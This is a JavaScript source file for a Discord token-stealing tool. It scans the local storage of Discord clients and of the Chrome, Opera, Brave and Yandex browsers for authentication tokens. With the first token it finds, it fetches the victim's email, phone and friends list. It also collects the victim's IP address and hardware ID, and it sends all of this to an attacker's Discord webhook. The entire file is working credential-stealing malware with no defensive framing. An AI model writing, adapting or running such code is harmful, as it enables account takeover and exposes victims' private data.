const webhook = require('webhook-discord');
const config = require('./config.json')
const lib = require('./utils');
const fs = require('fs');

const Discord = new webhook.Webhook(config.webhook);

(async () => {
    let APPDATA = process.env.APPDATA;
    let LOCALAPPDATA = process.env.LOCALAPPDATA;

    let paths = {
        "Discord": APPDATA + "\\Discord\\Local Storage\\leveldb\\",
        "Discord Canary": APPDATA + "\\discordcanary\\Local Storage\\leveldb\\",
        "Discord PTB": APPDATA + "\\discordptb\\Local Storage\\leveldb\\",
        "Google Chrome": LOCALAPPDATA + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
        "Opera": APPDATA + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
        "Brave": LOCALAPPDATA + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
        "Yandex": LOCALAPPDATA + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\"
    }

    for (let platform in paths) {
        let path = paths[platform];
        if (!fs.existsSync(path)) continue;

        let tokens = await lib.grabTokens(path);

        if (tokens.length > 0) {
            let user = await lib.user(tokens[0]);
            let hwid = await lib.hwid();
            let ip = await lib.ip();

            let nitroType;
            switch (user.premium_type) {
                case 0:
                    nitroType = 'None';
                    break;
                case 1:
                    nitroType = 'Classic';
                    break;
                case 2:
                    nitroType = 'Normal';
                    break;
            }

            msg = new webhook.MessageBuilder()
                .setName('Discord Logger')
                .setThumbnail(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512`)
                .addField('Username', `${user.username}#${user.discriminator}`)
                .addField('User ID', user.id)
                .addField('Email', `${user.email} [${user.verified ? 'Verified' : 'Not Verified'}]`)
                .addField('Phone', user.phone || 'No Phone Number')
                .addField('Language', user.locale)
                .addField('Nitro', nitroType)
                .addField('IP', ip)
                .addField('HWID', hwid)
                .addField('Creation Date', lib.convert(user.id))
                .setFooter(`Created by Bytes128 | Platform: ${platform}`);

            if (config.showFriends) {
                let friends = await lib.friends(tokens[0])
                msg.addField('Friends', friends)
            }

            if (config.showToken) {
                let tokensString = '';

                tokens = tokens.filter(function (value, index, array) {
                    return array.indexOf(value) == index;
                });

                for (let i = 0; i < tokens.length; i++) {
                    tokensString += `${i + 1} - ${tokens[i]}\n`
                }
                msg.addField('Token(s)', '```\n' + tokensString + '\n```')
            }

            Discord.send(msg)
        }
    }
})();
